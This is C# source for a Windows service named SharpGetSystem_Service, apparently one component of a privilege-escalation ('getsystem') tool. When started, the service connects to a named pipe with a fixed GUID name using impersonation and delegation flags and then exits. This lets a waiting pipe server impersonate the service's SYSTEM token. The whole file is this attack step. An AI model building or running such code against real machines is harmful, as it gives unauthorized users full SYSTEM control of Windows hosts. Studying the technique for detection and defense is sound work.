using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SharpGetSystem_Service {
	public partial class Service1 : ServiceBase {

		public const uint SECURITY_SQOS_PRESENT = 0x00100000;
		public const uint SECURITY_ANONYMOUS = 0 << 16;
		public const uint SECURITY_IDENTIFICATION = 1 << 16;
		public const uint SECURITY_IMPERSONATION = 2 << 16;
		public const uint SECURITY_DELEGATION = 3 << 16;

		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr CreateFile(
		 [MarshalAs(UnmanagedType.LPTStr)] string filename,
		 [MarshalAs(UnmanagedType.U4)] FileAccess access,
		 uint share,
		 IntPtr securityAttributes, // optional SECURITY_ATTRIBUTES struct or IntPtr.Zero
		 [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition,
		 uint flagsAndAttributes,
		 IntPtr templateFile);

		public Service1() {
			InitializeComponent();
		}

		protected override void OnStart(string[] args) {
			Thread.Sleep(3000);
			string pipe = "4edb8323-a792-4b24-a865-1246ba3f015a";
			string filename = String.Format(@"\\.\pipe\{0}", pipe);
			IntPtr hfile = CreateFile(filename, FileAccess.Read, 0, IntPtr.Zero, FileMode.Open, SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION | SECURITY_DELEGATION, IntPtr.Zero);
			Environment.Exit(1);
		}

		protected override void OnStop() {

		}
	}
}
